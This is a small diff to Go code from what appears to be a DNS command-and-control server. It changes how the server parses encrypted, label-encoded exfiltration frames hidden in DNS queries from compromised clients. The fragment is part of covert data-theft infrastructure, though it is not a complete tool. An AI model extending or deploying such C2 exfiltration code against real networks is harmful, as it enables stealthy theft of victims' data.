@@ -257,7 +257,7 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 	// Detect dedicated exfil client traffic first (label framing or legacy EDNS metadata)
 	if q.Type == 1 {
 		domainHints := buildExfilDomainHints(cfg.Domain, c2Manager.GetKnownDomains())
-		if frame, matched, frameErr := parseLabelEncodedExfilFrame(q.Name, domainHints); matched {
+		if frame, matched, frameErr := parseLabelEncodedExfilFrame(q.Name, domainHints, c2Manager.GetEncryptionKey()); matched {
 			ack := false
 			if frameErr == nil {
 				ack, err = c2Manager.ProcessExfilFrame(frame, clientIP)
